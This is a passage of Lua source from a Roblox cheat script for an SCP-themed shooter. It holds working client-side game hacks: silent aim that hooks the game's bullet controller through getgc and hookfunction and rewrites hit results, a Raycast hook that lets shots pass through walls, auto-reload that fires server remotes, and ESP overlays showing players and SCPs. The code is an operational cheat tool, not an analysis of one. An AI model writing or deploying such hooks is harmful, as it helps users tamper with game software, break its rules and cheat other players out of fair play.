                current.items, current.textItems, current.valueItems = nil, nil, nil
            end
        end
        BuloTrackConnection(root.DescendantAdded:Connect(invalidate))
        BuloTrackConnection(root.DescendantRemoving:Connect(invalidate))
    end
    if cache.dirty then
        cache.items = root:GetDescendants()
        cache.textItems, cache.valueItems = {}, {}
        for _, item in ipairs(cache.items) do
            if item:IsA("TextLabel") or item:IsA("TextButton") then
                cache.textItems[#cache.textItems + 1] = item
            elseif item:IsA("IntValue") or item:IsA("NumberValue") or item:IsA("StringValue") then
                cache.valueItems[#cache.valueItems + 1] = item
            end
        end
        cache.dirty = false
    end
    if kind == "text" then return cache.textItems end
    if kind == "value" then return cache.valueItems end
    return cache.items
end
local function BuloWalkDescendants(root)
    local stack = {{items = root:GetChildren(), index = 0}}
    local count = 0
    return function()
        while #stack > 0 do
            if BuloHubUnloaded then return nil end
            local frame = stack[#stack]
            frame.index += 1
            local item = frame.items[frame.index]
            if not item then
                stack[#stack] = nil
            elseif item.Parent and item:IsDescendantOf(root) then
                count += 1
                if count % 300 == 0 then
                    task.wait()
                    if BuloHubUnloaded then return nil end
                end
                local children = item:GetChildren()
                if #children > 0 then stack[#stack + 1] = {items = children, index = 0} end
                return count, item
            end
        end
    end
end
local DrawingAvailable = false
pcall(function()
    local t = Drawing.new("Square"); t:Remove(); DrawingAvailable = true
end)
local FakeDrawingMeta = {
    __index    = function(t, k) return rawget(t, k) end,
    __newindex = function(t, k, v) rawset(t, k, v) end,
}
local function MakeDrawingStub()
    local obj = setmetatable({
        Visible=false, Color=Color3.new(1,1,1), Transparency=1,
        Thickness=1, Text="", Size=14, Position=Vector2.new(0,0),
        Radius=100, NumSides=64, Filled=false, Center=false, Outline=false,
    }, FakeDrawingMeta)
    obj.Remove = function() end
    return obj
end
local function SafeDrawing(drawType)
    if DrawingAvailable then
        local ok, obj = pcall(function() return Drawing.new(drawType) end)
        if ok then return obj end
    end
    return MakeDrawingStub()
end
local ZonePoints = {
    Vector2.new(230.597,-205.779), Vector2.new(243.226,-213.159),
    Vector2.new(248.416,-223.719), Vector2.new(248.218,-298.761),
    Vector2.new(242.990,-310.065), Vector2.new(230.577,-316.980),
    Vector2.new(189.619,-316.127), Vector2.new(192.184,-426.891),
    Vector2.new(640.635,-391.501), Vector2.new(633.426,-104.750),
    Vector2.new(331.498,-18.667),  Vector2.new(195.072,-30.311),
    Vector2.new(196.518,-97.241),  Vector2.new(194.822,-113.296),
    Vector2.new(187.437,-176.586), Vector2.new(185.689,-206.413),
    Vector2.new(230.177,-205.787),
}
local function isInsideZone(position)
    local p = Vector2.new(position.X, position.Z)
    local isInside = false
    local j = #ZonePoints
    for i = 1, #ZonePoints do
        local pi = ZonePoints[i]; local pj = ZonePoints[j]
        if ((pi.Y > p.Y) ~= (pj.Y > p.Y)) and
           (p.X < (pj.X-pi.X)*(p.Y-pi.Y)/(pj.Y-pi.Y)+pi.X) then
            isInside = not isInside
        end
        j = i
    end
    return isInside
end
local function hasGunCheck(character)
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Laser") then return true end
    end
    return false
end
local function hasSCP096TagCheck(player)
    local character = player.Character
    if character and character:FindFirstChild("Head") then
        if character.Head:FindFirstChild("SCP096Tag") then return true end
    end
    return false
end
local function isEnemyAdvanced(player)
    if not player or player == LocalPlayer or not player.Character then return false end
    local targetChar = player.Character
    if hasSCP096TagCheck(player) then return true end
    local pInfection = player:GetAttribute("Infection") or 0
    local cInfection = targetChar:GetAttribute("Infection") or 0
    if pInfection > 100 or cInfection > 100 then return true end
    local isMeInfected = LocalPlayer:GetAttribute("Infected001") or
                         (LocalPlayer.Character and LocalPlayer.Character:GetAttribute("Infected001"))
    local isTargetInfected = player:GetAttribute("Infected001") or targetChar:GetAttribute("Infected001")
    if isMeInfected then return not isTargetInfected
    elseif isTargetInfected then return true end
    local localTeam  = LocalPlayer.Team
    local targetTeam = player.Team
    if not localTeam or not targetTeam then return true end
    if player:FindFirstChild("Authorized") or targetChar:FindFirstChild("Authorized") then return false end
    local isMeCDorChaos     = (localTeam.Name=="Class - D" or localTeam.Name=="Chaos Insurgency")
    local isTargetCDorChaos = (targetTeam.Name=="Class - D" or targetTeam.Name=="Chaos Insurgency")
    if isMeCDorChaos then
        return not isTargetCDorChaos
    else
        if targetTeam.Name == "Chaos Insurgency" then return true end
        if targetTeam.Name == "Class - D" then
            local hrp = targetChar:FindFirstChild("HumanoidRootPart")
            if not hrp then return false end
            return (not isInsideZone(hrp.Position)) or hasGunCheck(targetChar)
        end
    end
    return false
end
local silentAimEnabled = false
local silentAimFOV = 100
local silentAimHitChance = 100
local silentAimTargetPart = "Auto"
local silentAimWallCheck = true
local silentAimWallbang = false
local silentAimAllowWallbang = true
local silentAimTargetSCPs = false
local silentAimHeadChance = 100
local silentAimTorsoChance = 100
local silentAimRootChance = 100
local silentAimMaxDist = 300
local silentAimTarget = nil
local autoReloadEnabled = false
local autoReloadLastPress = 0
local Cam              = workspace.CurrentCamera
local silentFOVring = SafeDrawing("Circle")
silentFOVring.Visible   = false
silentFOVring.Thickness = 1
silentFOVring.Color     = Color3.fromRGB(255, 255, 255)
silentFOVring.Filled    = false
silentFOVring.NumSides  = 64
silentFOVring.Radius    = silentAimFOV
local SA_HITBOXES = {
    "Head", "HumanoidRootPart", "Torso", "UpperTorso", "LowerTorso",
    "LeftUpperArm", "LeftLowerArm", "LeftHand", "RightUpperArm", "RightLowerArm", "RightHand",
    "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot",
}
local saRayParams = RaycastParams.new()
saRayParams.FilterType = Enum.RaycastFilterType.Blacklist
saRayParams.IgnoreWater = true
local saRaycastCharacter = nil
local function getCharacterPartSA(character, partName)
    if partName == "Torso" then
        return character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    end
    return character:FindFirstChild(partName)
end
local function getVisibleHitPointSA(part, targetCharacter)
    local localCharacter = LocalPlayer.Character
    if not localCharacter or not part or not targetCharacter then return nil end
    if saRaycastCharacter ~= localCharacter then
        saRaycastCharacter = localCharacter
        saRayParams.FilterDescendantsInstances = {localCharacter}
    end
    local origin = Cam.CFrame.Position
    local half = part.Size * 0.5
    local localCamera = part.CFrame:PointToObjectSpace(origin)
    local nearestSurface = Vector3.new(
        math.clamp(localCamera.X, -half.X + 0.02, half.X - 0.02),
        math.clamp(localCamera.Y, -half.Y + 0.02, half.Y - 0.02),
        math.clamp(localCamera.Z, -half.Z + 0.02, half.Z - 0.02)
    )
    local sampleCount = part.Size.Y > 1 and 3 or 2
    for sampleIndex = 1, sampleCount do
        local point
        if sampleIndex == 1 then
            point = part.CFrame:PointToWorldSpace(nearestSurface)
        elseif sampleIndex == 2 then
            point = part.Position
        else
            point = part.CFrame:PointToWorldSpace(Vector3.new(
                nearestSurface.X, nearestSurface.Y * 0.5, nearestSurface.Z
            ))
        end
        local direction = point - origin
        if direction.Magnitude <= 0.01 then return point end
        local result = workspace:Raycast(origin, direction, saRayParams)
        if not result then return point end
        if result.Instance and result.Instance:IsDescendantOf(targetCharacter) then
            return result.Position
        end
    end
    return nil
end
local function getTargetPartScoreSA(part, targetCharacter, center, camPos, fovSq, maxDistSq)
    if not part or not part:IsA("BasePart") then return nil, nil end
    local diff = camPos - part.Position
    if diff:Dot(diff) > maxDistSq then return nil, nil end
    local useWallCheck = silentAimWallCheck and not silentAimWallbang
    local hitPoint = useWallCheck and getVisibleHitPointSA(part, targetCharacter) or part.Position
    if not hitPoint then return nil, nil end
    local screenPoint, onScreen = Cam:WorldToViewportPoint(hitPoint)
    if not onScreen or screenPoint.Z <= 0 then return nil, nil end
    local dx = screenPoint.X - center.X
    local dy = screenPoint.Y - center.Y
    local screenDistSq = dx * dx + dy * dy
    if screenDistSq >= fovSq then return nil, nil end
    return screenDistSq, hitPoint
end
local function getNearestHitboxSA(character, center, camPos, fovSq, maxDistSq)
    local bestPart, bestScore, bestPoint = nil, math.huge, nil
    local seen = {}
    for _, name in ipairs(SA_HITBOXES) do
        local part = getCharacterPartSA(character, name)
        if part and not seen[part] then
            seen[part] = true
            local preview, onScreen = Cam:WorldToViewportPoint(part.Position)
            if onScreen and preview.Z > 0 then
                local dx = preview.X - center.X
                local dy = preview.Y - center.Y
                local previewScore = dx * dx + dy * dy
                if previewScore < bestScore and previewScore < fovSq then
                    local score, point = getTargetPartScoreSA(part, character, center, camPos, fovSq, maxDistSq)
                    if score and score < bestScore then
                        bestPart, bestScore, bestPoint = part, score, point
                    end
                end
            end
        end
    end
    return bestPart, bestScore, bestPoint
end
local function getAutoTargetPartSA(character, center, camPos, fovSq, maxDistSq)
    for candidateIndex = 1, 3 do
        local name, chance
        if candidateIndex == 1 then
            name, chance = "Head", silentAimHeadChance
        elseif candidateIndex == 2 then
            name, chance = "Torso", silentAimTorsoChance
        else
            name, chance = "HumanoidRootPart", silentAimRootChance
        end
        if chance > 0 then
            local part = getCharacterPartSA(character, name)
            local score, point = getTargetPartScoreSA(part, character, center, camPos, fovSq, maxDistSq)
            if score and math.random(1, 100) <= chance then
                return part, score, point
            end
        end
    end
    return nil, nil, nil
end
local function chooseTargetPartSA(character, center, camPos, fovSq, maxDistSq)
    if silentAimTargetPart == "Auto" then
        return getAutoTargetPartSA(character, center, camPos, fovSq, maxDistSq)
    elseif silentAimTargetPart == "Nearest Hitbox" then
        return getNearestHitboxSA(character, center, camPos, fovSq, maxDistSq)
    end
    local part = getCharacterPartSA(character, silentAimTargetPart)
    local score, point = getTargetPartScoreSA(part, character, center, camPos, fovSq, maxDistSq)
    return part, score, point
end
local saLastUpdate = 0
local SA_RATE = 0.04
local function getClosestSA()
    if not silentAimEnabled then return nil end
    local nearestTarget, nearestScore = nil, math.huge
    local center = Vector2.new(Cam.ViewportSize.X * 0.5, Cam.ViewportSize.Y * 0.5)
    local camPos = Cam.CFrame.Position
    local fovSq = silentAimFOV * silentAimFOV
    local maxDistSq = silentAimMaxDist * silentAimMaxDist
    local function evaluate(character)
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Health <= 0 then return end
        local part, score, point = chooseTargetPartSA(character, center, camPos, fovSq, maxDistSq)
        if part and score and point and score < nearestScore then
            nearestScore = score
            nearestTarget = {Part = part, Position = point, Character = character}
        end
    end
    for _, player in ipairs(Players:GetPlayers()) do
        if isEnemyAdvanced(player) then evaluate(player.Character) end
    end
    if silentAimTargetSCPs then
        local scpFolder = workspace:FindFirstChild("SCPs")
        if scpFolder then
            for _, model in ipairs(scpFolder:GetChildren()) do
                if model:IsA("Model") then evaluate(model) end
            end
        end
    end
    return nearestTarget
end
RS:BindToRenderStep("SilentAimUpdate", Enum.RenderPriority.Camera.Value + 1, function()
    if not silentAimEnabled then return end
    if DrawingAvailable then
        pcall(function()
            silentFOVring.Visible  = true
            silentFOVring.Position = Vector2.new(Cam.ViewportSize.X / 2, Cam.ViewportSize.Y / 2)
            silentFOVring.Radius   = silentAimFOV
        end)
    end
    local now = tick()
    if now - saLastUpdate >= SA_RATE then
        saLastUpdate    = now
        silentAimTarget = getClosestSA()
    end
end)
pcall(function()
    local newcclosure2 = newcclosure or function(f) return f end
    local constantsWanted = {Bullet = true, EasterEggThing = true, ["SCP-066"] = true}
    local function hasControllerConstants(functionObject)
        if not getconstants then return false end
        local ok, constants = pcall(getconstants, functionObject)
        if not ok or type(constants) ~= "table" then return false end
        local found = 0
        for _, constant in ipairs(constants) do
            if constantsWanted[constant] then found += 1 end
        end
        return found >= 2
    end
    local function findSilentAimControllerFunctionSA()
        local controllerScript = LocalPlayer.PlayerScripts:FindFirstChild("Controller", true)
        local source = controllerScript and "=" .. controllerScript:GetFullName()
        if filtergc then
            local ok, result = pcall(filtergc, "function", {
                Constants = {"Bullet", "EasterEggThing", "SCP-066"},
                IgnoreExecutor = true
            })
            if ok then
                if type(result) == "function" then result = {result} end
                for _, functionObject in next, result or {} do
                    local info = debug.getinfo(functionObject)
                    if not source or (info and rawget(info, "source") == source) then
                        return functionObject
                    end
                end
            end
        end
        if getgc and source then
            for _, object in next, getgc(false) do
                if type(object) == "function" then
                    local ok, info = pcall(debug.getinfo, object)
                    if ok and info and rawget(info, "source") == source and hasControllerConstants(object) then
                        return object
                    end
                end
            end
        end
        return nil
    end
    local function installSilentAimHookSA()
        if BuloHubUnloaded or BuloSilentAimController then return BuloSilentAimController ~= nil end
        if not hookfunction then return false end
        local controllerFunction = findSilentAimControllerFunctionSA()
        if not controllerFunction then return false end
        local oldController
        local buloControllerHook = newcclosure2(function(_, hitResult, ...)
            if silentAimEnabled and silentAimTarget and silentAimTarget.Part
                and silentAimTarget.Part.Parent and math.random(1, 100) <= silentAimHitChance then
                local hitPosition = silentAimTarget.Position
                if not silentAimAllowWallbang then
                    hitPosition = getVisibleHitPointSA(silentAimTarget.Part, silentAimTarget.Character)
                end
                if hitPosition then
                    hitResult = {
                        ["Instance"] = silentAimTarget.Part,
                        ["Position"] = hitPosition,
                        ["Normal"] = Vector3.new(0, 1, 0),
                        ["Material"] = silentAimTarget.Part.Material
                    }
                end
            end
            return oldController(_, hitResult, ...)
        end)
        local ok, previous = pcall(hookfunction, controllerFunction, buloControllerHook)
        if not ok or type(previous) ~= "function" then return false end
        oldController = previous
        BuloSilentAimController = controllerFunction
        BuloSilentAimOriginal = previous
        BuloSilentAimHook = buloControllerHook
        return true
    end
    local trying = false
    function BuloStartSilentAimHook()
        if trying or BuloHubUnloaded or not silentAimEnabled or BuloSilentAimController
            or type(hookfunction) ~= "function" then return end
        trying = true
        task.spawn(function()
            for _ = 1, 50 do
                if BuloHubUnloaded or not silentAimEnabled or installSilentAimHookSA() then break end
                task.wait(0.5)
            end
            trying = false
        end)
    end
end)
pcall(function()
    if not WallbangFeatureAvailable or not hookfunction then return end
    local newcclosure2 = newcclosure or function(f) return f end
    local oldRaycast
    local buloWallbangHook = newcclosure2(function(self, origin, direction, rayParams, ...)
        local colonCall = typeof(self) ~= "Vector3"
        local realOrigin = colonCall and origin or self
        local realDirection = colonCall and direction or origin
        local trailing = {...}
        if not BuloHubUnloaded and silentAimEnabled and silentAimWallbang
            and (BuloWallbangInputHeld or tick() <= BuloWallbangShotUntil)
            and silentAimTarget and silentAimTarget.Part
            and typeof(realOrigin) == "Vector3" and typeof(realDirection) == "Vector3"
            and realDirection.Magnitude > 0.05 then
            local localCharacter = LocalPlayer.Character
            local root = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
            local camera = workspace.CurrentCamera
            local nearLocalCharacter = root and (realOrigin - root.Position).Magnitude <= 120
            local nearCamera = camera and (realOrigin - camera.CFrame.Position).Magnitude <= 120
            local targetPart = silentAimTarget.Part
            local targetModel = targetPart:FindFirstAncestorOfClass("Model")
            local targetPosition = silentAimTarget.Position or targetPart.Position
            local toTarget = targetPosition - realOrigin
            local isAimedAtTarget = toTarget.Magnitude > 0.05
                and realDirection.Unit:Dot(toTarget.Unit) >= 0.70
            if (nearLocalCharacter or nearCamera) and isAimedAtTarget and targetPart.Parent then
                local targetParams = RaycastParams.new()
                targetParams.FilterType = Enum.RaycastFilterType.Include
                targetParams.FilterDescendantsInstances = {targetModel or targetPart}
                targetParams.IgnoreWater = true
                pcall(function()
                    if rayParams and rayParams.CollisionGroup then
                        targetParams.CollisionGroup = rayParams.CollisionGroup
                    end
                end)
                local rayLength = math.max(realDirection.Magnitude, toTarget.Magnitude + 2)
                if colonCall then
                    return oldRaycast(self, realOrigin, toTarget.Unit * rayLength, targetParams, table.unpack(trailing))
                end
                return oldRaycast(realOrigin, toTarget.Unit * rayLength, targetParams, table.unpack(trailing))
            end
        end
        if colonCall then
            return oldRaycast(self, origin, direction, rayParams, table.unpack(trailing))
        end
        return oldRaycast(self, origin, direction, table.unpack(trailing))
    end)
    local ok, previous = pcall(hookfunction, workspace.Raycast, buloWallbangHook)
    if ok and type(previous) == "function" then
        oldRaycast = previous
        BuloWallbangRaycastOriginal = previous
        BuloWallbangRaycastHook = buloWallbangHook
        WallbangFeatureAvailable = true
    end
end)
BuloTrackConnection(UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed or not silentAimEnabled or not silentAimWallbang then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch
        or input.KeyCode == Enum.KeyCode.ButtonR2 then
        BuloWallbangInputHeld = true
        BuloWallbangShotUntil = tick() + 0.50
    end
end))
BuloTrackConnection(UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch
        or input.KeyCode == Enum.KeyCode.ButtonR2 then
        BuloWallbangInputHeld = false
    end
end))
local getAmmoValueSA, clearAmmoCache
do
    local cachedTool, scanAt = nil, 0
    local values = {}
    clearAmmoCache = function()
        cachedTool, scanAt = nil, 0
        table.clear(values)
    end
    getAmmoValueSA = function(tool)
        if not tool then return nil end
        local bestValue, bestScore = nil, -math.huge
        local function consider(name, value)
            if type(value) ~= "number" then return end
            local lower = tostring(name):lower()
            if lower:find("max", 1, true) or lower:find("reserve", 1, true)
                or lower:find("total", 1, true) or lower:find("capacity", 1, true)
                or lower:find("stored", 1, true) then return end
            local score = 0
            if lower == "currentammo" or lower == "ammo" then score = 150 end
            if lower == "clip" or lower == "magazine" then score = math.max(score, 135) end
            if lower:find("current", 1, true) then score += 50 end
            if lower:find("ammo", 1, true) then score += 35 end
            if lower:find("clip", 1, true) or lower:find("mag", 1, true) then score += 30 end
            if lower:find("bullet", 1, true) or lower:find("round", 1, true) then score += 20 end
            if score > bestScore then bestScore, bestValue = score, value end
        end
        for name, value in pairs(tool:GetAttributes()) do
            consider(name, value)
        end
        local now = tick()
        if cachedTool ~= tool or now >= scanAt then
            cachedTool, scanAt = tool, now + 0.5
            table.clear(values)
            for _, item in ipairs(BuloCachedDescendants(tool, "value")) do
                if item:IsA("IntValue") or item:IsA("NumberValue") or item:IsA("StringValue") then
                    table.insert(values, item)
                end
            end
        end
        for _, item in ipairs(values) do
            if item.Parent and item:IsDescendantOf(tool) then
                if item:IsA("StringValue") then consider(item.Name, tonumber(item.Value))
                else consider(item.Name, item.Value) end
            end
        end
        return bestValue
    end
end
local getGuiAmmoValueSA, clearGuiAmmoCache
do
    local cachedGui, scanAt = nil, 0
    local candidates = {}
    clearGuiAmmoCache = function()
        cachedGui, scanAt = nil, 0
        table.clear(candidates)
    end
    getGuiAmmoValueSA = function()
        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
        if not playerGui then return nil end
        local now = tick()
        if cachedGui ~= playerGui or now >= scanAt then
            cachedGui, scanAt = playerGui, now + 1
            table.clear(candidates)
            for _, item in ipairs(BuloCachedDescendants(playerGui, "text")) do
                if item:IsA("TextLabel") or item:IsA("TextButton") then
                    local name = item.Name:lower()
                    local text = tostring(item.Text or "")
                    if name:find("ammo", 1, true) or name:find("clip", 1, true)
                        or name:find("mag", 1, true) or text:match("^%s*%d+%s*/%s*%d+%s*$") then
                        table.insert(candidates, item)
                    end
                end
            end
        end
        local bestValue, bestScore = nil, -math.huge
        for _, item in ipairs(candidates) do
            if item.Parent and item:IsDescendantOf(playerGui) then
                local name = item.Name:lower()
                local text = tostring(item.Text or "")
                local current, maximum = text:match("^%s*(%d+)%s*/%s*(%d+)%s*$")
                if current and maximum then
                    local score = 10
                    if name:find("ammo", 1, true) then score += 60 end
                    if name:find("clip", 1, true) or name:find("mag", 1, true) then score += 50 end
                    if score > bestScore then bestScore, bestValue = score, tonumber(current) end
                end
            end
        end
        return bestValue
    end
end
local function fireReloadRemotesSA(tool)
    local visited = {}
    local function tryRemote(remote)
        if not remote or visited[remote] then return end
        visited[remote] = true
        local name = remote.Name:lower()
        if not (name == "reload" or name:find("reload", 1, true) or name == "rld") then return end
        pcall(function()
            if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                remote:FireServer()
            elseif remote:IsA("RemoteFunction") then
                task.spawn(function() pcall(function() remote:InvokeServer() end) end)
            end
        end)
    end
    local roots = {
        tool,
        LocalPlayer.Character,
        ReplicatedStorage
    }
    for _, root in ipairs(roots) do
        if root then
            if root:IsA("RemoteEvent") or root:IsA("UnreliableRemoteEvent") or root:IsA("RemoteFunction") then
                tryRemote(root)
            end
            for _, item in ipairs(root:GetDescendants()) do
                if item:IsA("RemoteEvent") or item:IsA("UnreliableRemoteEvent") or item:IsA("RemoteFunction") then
                    tryRemote(item)
                end
            end
        end
    end
end
local function triggerReloadSA(tool)
    fireReloadRemotesSA(tool)
    pcall(function()
        VIM:SendKeyEvent(true, Enum.KeyCode.R, false, game)
        task.wait(0.06)
        VIM:SendKeyEvent(false, Enum.KeyCode.R, false, game)
    end)
end
do
    local generation = 0
    function BuloSetAutoReload(on)
        autoReloadEnabled = on and true or false
        generation += 1
        if not autoReloadEnabled or BuloHubUnloaded then
            clearAmmoCache()
            clearGuiAmmoCache()
            return
        end
        local current = generation
        task.spawn(function()
            while not BuloHubUnloaded and autoReloadEnabled and generation == current do
                pcall(function()
                    local character = LocalPlayer.Character
                    local tool = character and character:FindFirstChildOfClass("Tool")
                    if not tool then return end
                    local ammo = getAmmoValueSA(tool)
                    if ammo == nil then ammo = getGuiAmmoValueSA() end
                    if ammo ~= nil and ammo <= 0 and tick() - autoReloadLastPress >= 0.40 then
                        autoReloadLastPress = tick()
                        triggerReloadSA(tool)
                    end
                end)
                task.wait(0.08)
            end
        end)
    end
end
local scpEspEnabled = false
local scpEspShowNames = true
local scpEspColor = Color3.fromRGB(0, 120, 255)
local scpEspNameColor = Color3.fromRGB(255, 255, 255)
local excludedSCPs = {["SCP-409"] = true, ["SCP-087"] = true, ["SCP-002"] = true}
local function getSCPLabelPart(obj)
    if obj:IsA("BasePart") then return obj end
    if obj:IsA("Model") and obj.PrimaryPart then return obj.PrimaryPart end
    return obj:FindFirstChild("HumanoidRootPart", true)
        or obj:FindFirstChildWhichIsA("BasePart", true)
end
local function clearSCPHighlights()
    local scpFolder = workspace:FindFirstChild("SCPs")
    if scpFolder then
        for _, scp in ipairs(scpFolder:GetChildren()) do
            local highlight = scp:FindFirstChild("SCPEsp")
            local label = scp:FindFirstChild("SCPEspName")
            if highlight then highlight:Destroy() end
            if label then label:Destroy() end
        end
    end
end
local function createSCPHighlight(obj)
    if not obj:FindFirstChild("SCPEsp") then
        local highlight = Instance.new("Highlight")
        highlight.Name = "SCPEsp"
        highlight.Adornee = obj
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.FillColor = scpEspColor
        highlight.FillTransparency = 1
        highlight.OutlineTransparency = 0
        highlight.OutlineColor = scpEspColor
        highlight.Parent = obj
    end
    local label = obj:FindFirstChild("SCPEspName")
    if not label then
        local adornee = getSCPLabelPart(obj)
        if not adornee then return end
        label = Instance.new("BillboardGui")
        label.Name = "SCPEspName"
        label.Adornee = adornee
        label.AlwaysOnTop = true
        label.Size = UDim2.fromOffset(180, 28)
        label.StudsOffsetWorldSpace = Vector3.new(0, 3.5, 0)
        label.Parent = obj
        local text = Instance.new("TextLabel")
        text.Name = "Name"
        text.Size = UDim2.fromScale(1, 1)
        text.BackgroundTransparency = 1
        text.Font = Enum.Font.GothamBold
        text.TextSize = 11
        text.TextStrokeTransparency = 0
        text.TextColor3 = scpEspNameColor
        text.Text = obj.Name
        text.Parent = label
    end
    label.Enabled = scpEspShowNames
    local text = label:FindFirstChild("Name")
    if text and text:IsA("TextLabel") then
        text.Text = obj.Name
        text.TextColor3 = scpEspNameColor
    end
end
local function applySCPESPColors()
    local scpFolder = workspace:FindFirstChild("SCPs")
    if not scpFolder then return end
    for _, scp in ipairs(scpFolder:GetChildren()) do
        local highlight = scp:FindFirstChild("SCPEsp")
        if highlight and highlight:IsA("Highlight") then
            highlight.FillColor = scpEspColor
            highlight.OutlineColor = scpEspColor
        end
        local label = scp:FindFirstChild("SCPEspName")
        local text = label and label:FindFirstChild("Name")
        if text and text:IsA("TextLabel") then text.TextColor3 = scpEspNameColor end
    end
end
local function setSCPNameLabelsVisible(visible)
    scpEspShowNames = visible
    local scpFolder = workspace:FindFirstChild("SCPs")
    if not scpFolder then return end
    for _, scp in ipairs(scpFolder:GetChildren()) do
        local label = scp:FindFirstChild("SCPEspName")
        if label and label:IsA("BillboardGui") then
            label.Enabled = visible and scpEspEnabled
        end
    end
end
do
    local generation = 0
    function BuloSetSCPESP(on)
        scpEspEnabled = on and true or false
        generation += 1
        if not scpEspEnabled then clearSCPHighlights(); return end
        if BuloHubUnloaded then return end
        local current = generation
        task.spawn(function()
            while not BuloHubUnloaded and scpEspEnabled and generation == current do
                local scpFolder = workspace:FindFirstChild("SCPs")
                if scpFolder then
                    for _, scp in ipairs(scpFolder:GetChildren()) do
                        if not excludedSCPs[scp.Name] then createSCPHighlight(scp) end
                    end
                end
                task.wait(1)
            end
        end)
    end
end
local ESPConfig = {
    Enabled=false, ShowBoxes=true, ShowNames=true,
    ShowHealthBar=true, ShowTeamColor=true, TextSize=14,
    BoxThickness=2, BoxTransparency=0.5, MaxDistance=5000,
    HeightOffset=Vector3.new(0,3,0), EnemyColor=Color3.fromRGB(255,70,70), AllyColor=Color3.fromRGB(70,255,70),
}
local function isAlly(p)
    if p==Player then return true end
    if not Cfg.IgnoreTeam then return false end
    if not Player.Team or not p.Team then return false end
    return Player.Team==p.Team
end
local function isEnemy(p) return not isAlly(p) end
local function CreateESPForPlayer(plr)
    if plr==Player or ESPObjects[plr] then return end
    local obj={
        Box=SafeDrawing("Square"), Text=SafeDrawing("Text"),
        HealthBG=SafeDrawing("Square"), HealthBar=SafeDrawing("Square"),
    }
    obj.Box.Visible=false; obj.Box.Thickness=ESPConfig.BoxThickness
    obj.Box.Transparency=ESPConfig.BoxTransparency; obj.Box.Filled=false
    obj.Text.Visible=false; obj.Text.Size=ESPConfig.TextSize
    obj.Text.Center=true; obj.Text.Outline=true; obj.Text.Transparency=1
    obj.HealthBG.Visible=false; obj.HealthBG.Filled=true
    obj.HealthBG.Color=Color3.fromRGB(35,35,35); obj.HealthBG.Transparency=0.5
    obj.HealthBar.Visible=false; obj.HealthBar.Filled=true; obj.HealthBar.Transparency=1
    ESPObjects[plr]=obj
end
local function HideESP(obj)
    obj.Box.Visible=false; obj.Text.Visible=false
    obj.HealthBG.Visible=false; obj.HealthBar.Visible=false
end
local function GetHpColor(pct)
    return Color3.new(math.clamp(2*(1-pct),0,1),math.clamp(2*pct,0,1),0)
end
local function RenderESP()
    if not DrawingAvailable then return end
    if not ESPConfig.Enabled then
        for _, obj in pairs(ESPObjects) do HideESP(obj) end
        return
    end
    local camPos=cur().CFrame.Position
    for plr, obj in pairs(ESPObjects) do
        if not plr or not plr.Parent or not plr.Character then HideESP(obj); continue end
        local char=plr.Character
        local hrp=char:FindFirstChild("HumanoidRootPart")
        local hum=char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health<=0 then HideESP(obj); continue end
        local dist=(hrp.Position-camPos).Magnitude
        if dist<0.5 or dist>ESPConfig.MaxDistance then HideESP(obj); continue end
        if Cfg.IgnoreTeam and isAlly(plr) then HideESP(obj); continue end
        local headTop=hrp.Position+ESPConfig.HeightOffset
        local feetBot=hrp.Position-ESPConfig.HeightOffset
        local topSP=cur():WorldToViewportPoint(headTop)
        local botSP,onScreen=cur():WorldToViewportPoint(feetBot)
        if not onScreen or topSP.Z<=0 then HideESP(obj); continue end
        local h=math.abs(topSP.Y-botSP.Y); local w=h*0.55
        if h<4 then HideESP(obj); continue end
        local bPos=Vector2.new(topSP.X-w*0.5,topSP.Y)
        local enemy2=isEnemy(plr)
        local teamC=plr.Team and plr.TeamColor.Color or espColor
        local boxCol=ESPConfig.ShowTeamColor and teamC or (enemy2 and ESPConfig.EnemyColor or ESPConfig.AllyColor)
        if ESPConfig.ShowBoxes then
            obj.Box.Position=bPos; obj.Box.Size=Vector2.new(w,h)
            obj.Box.Color=boxCol; obj.Box.Visible=true
        else
            obj.Box.Visible=false
        end
        if ESPConfig.ShowNames then
            obj.Text.Text=plr.Name; obj.Text.Color=boxCol
            obj.Text.Size=ESPConfig.TextSize
            obj.Text.Position=Vector2.new(topSP.X,topSP.Y-17)
            obj.Text.Visible=true
        else
            obj.Text.Visible=false
        end
        if ESPConfig.ShowHealthBar then
            local hpPct=math.clamp(hum.Health/math.max(1,hum.MaxHealth),0,1)
            local bw=3; local bx=bPos.X-bw-2
            obj.HealthBG.Position=Vector2.new(bx,topSP.Y); obj.HealthBG.Size=Vector2.new(bw,h); obj.HealthBG.Visible=true
            obj.HealthBar.Position=Vector2.new(bx,topSP.Y+h*(1-hpPct))
            obj.HealthBar.Size=Vector2.new(bw,h*hpPct)
            obj.HealthBar.Color=GetHpColor(hpPct); obj.HealthBar.Visible=true
        else
            obj.HealthBG.Visible=false; obj.HealthBar.Visible=false
        end
    end
end
do
    local wasEnabled, elapsed = false, 1 / 60
    table.insert(connections, RS.RenderStepped:Connect(function(dt)
        if BuloHubUnloaded or not DrawingAvailable then return end
        if not ESPConfig.Enabled then
            if wasEnabled then
                wasEnabled = false
                pcall(RenderESP)
            end
            elapsed = 1 / 60
            return
        end
        wasEnabled = true
        elapsed += type(dt) == "number" and math.clamp(dt, 0, 0.5) or 1 / 60
        if elapsed < 1 / 60 then return end
        elapsed %= 1 / 60
        pcall(RenderESP)
    end))
end
BuloTrackConnection(Players.PlayerAdded:Connect(function(p)
    if not BuloHubUnloaded and ESPConfig.Enabled then pcall(CreateESPForPlayer, p) end
end))
BuloTrackConnection(Players.PlayerRemoving:Connect(function(p)
    pcall(function()
        if ESPObjects[p] then
